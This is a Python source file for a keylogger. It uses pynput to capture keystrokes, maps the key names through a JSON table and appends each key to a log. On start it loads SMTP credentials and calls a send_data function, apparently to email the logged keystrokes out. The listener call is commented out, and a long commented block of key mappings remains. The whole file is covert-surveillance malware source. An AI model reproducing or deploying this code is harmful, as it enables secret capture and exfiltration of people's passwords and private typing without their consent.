from pynput.keyboard import Listener
from json import loads
from datetime import datetime

from send_email import send_data
from log import log

with open("data/keys.json", "r") as keysFileObj:
    keys = loads(keysFileObj.read())
    keysFileObj.close()


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter in keys["keys"].keys():
        letter = keys["keys"][letter]

    # if letter == "Key.cmd":
    #     letter = ' [CMD] '
    # if letter == "Key.home":
    #     letter = ' [HOME] '
    # if letter == "Key.end":
    #     letter = ' [END] '
    # if letter == "Key.insert":
    #     letter = ' [INS] '
    # if letter == "Key.delete":
    #     letter = ' [DEL] '
    # if letter == "Key.page_up":
    #     letter = ' [PAGEUP] '
    # if letter == "Key.page_down":
    #     letter = ' [PGDOWN] '
    # if letter == "Key.esc":
    #     letter = ' [ESC] '
    # if letter == "Key.menu":
    #     letter = ' [MENU] '
    #
    # if letter == "Key.up":
    #     letter = ' [UP] '
    # if letter == "Key.down":
    #     letter = ' [DOWN] '
    # if letter == "Key.left":
    #     letter = ' [LEFT] '
    # if letter == "Key.right":
    #     letter = ' [RIGHT] '
    # if letter == "<166>":
    #     letter = ' [PGLEFT] '
    # if letter == "<167>":
    #     letter = ' [PGRIGHT] '
    #
    # if letter == "<255>":
    #     letter = ' [FN] '
    # if letter == "Key.f1":
    #     letter = ' F1 '
    # if letter == "Key.f2":
    #     letter = ' F2 '
    # if letter == "Key.f3":
    #     letter = ' F3 '
    # if letter == "Key.f4":
    #     letter = ' F4 '
    # if letter == "Key.f5":
    #     letter = ' F5 '
    # if letter == "Key.f6":
    #     letter = ' F6 '
    # if letter == "Key.f7":
    #     letter = ' F7 '
    # if letter == "Key.f8":
    #     letter = ' F8 '
    # if letter == "Key.f9":
    #     letter = ' F9 '
    # if letter == "Key.f10":
    #     letter = ' F10 '
    # if letter == "Key.f11":
    #     letter = ' F11 '
    # if letter == "Key.f12":
    #     letter = ' F12 '

    log(letter, "a")


if __name__ == "__main__":
    log("\n[RESTART]\n", "a")
    # Listener(on_press=write_to_file)
    if datetime.now().strftime("%Y-%m-%d %H:%M:%S"):
        with open("data/cred.json", "r") as smtpCredentialsFileObj:
            send_data(loads(smtpCredentialsFileObj.read()))
